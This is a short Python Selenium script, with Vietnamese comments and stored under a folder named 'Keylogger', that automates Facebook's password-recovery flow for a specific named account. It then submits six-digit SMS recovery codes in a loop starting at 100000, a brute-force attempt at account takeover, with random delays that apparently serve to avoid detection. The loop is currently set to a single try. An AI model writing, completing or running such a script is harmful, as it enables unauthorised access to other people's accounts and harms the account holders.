from selenium import webdriver
from time import sleep
from random import randint, random
from selenium.webdriver.common.keys import Keys

#Khai báo browser
browser = webdriver.Chrome(executable_path="E:\Keylogger\chromedriver.exe")
#browsercode = webdriver.Chrome(executable_path="E:\Keylogger\chromedriver.exe")

#mở web
browser.get("https://www.facebook.com/")

sleep(randint(1,5))

#AI(điền thông tin)
TxtUser = browser.find_element_by_id("email")
TxtUser.send_keys("thang.ly.921677")
sleep(randint(2,6))
#CodeUser = browsercode.find_element_by_id("recovery_code_entry")
#CodeUser.send_keys("abc")
login = browser.find_element_by_xpath("/html/body/div[1]/div[2]/div[1]/div/div/div/div[2]/div/div[1]/form/div[2]/button")
login.click()

button = browser.find_element_by_class_name("_97w4")
sleep(randint(1,5))
button.click()

sleep(randint(1,5))
smsbutton = browser.find_element_by_xpath("/html/body/div[1]/div[2]/div[1]/div/div[2]/form/div/div[3]/div/div[1]/button")
smsbutton.click()

sleep(randint(3,5))

smscode = browser.find_element_by_id("recovery_code_entry")
continue_action = browser.find_element_by_name("reset_action")

for i in range(1):
    num=100000+i
    print(str(num) + "\n")
    smscode.send_keys(num)
    sleep(randint(1,3))
    continue_action.click()
    
    #smscode.clear()


#Dừng chương trình 5 giây

#sleep(10)

#đóng chương trình
#browser.close()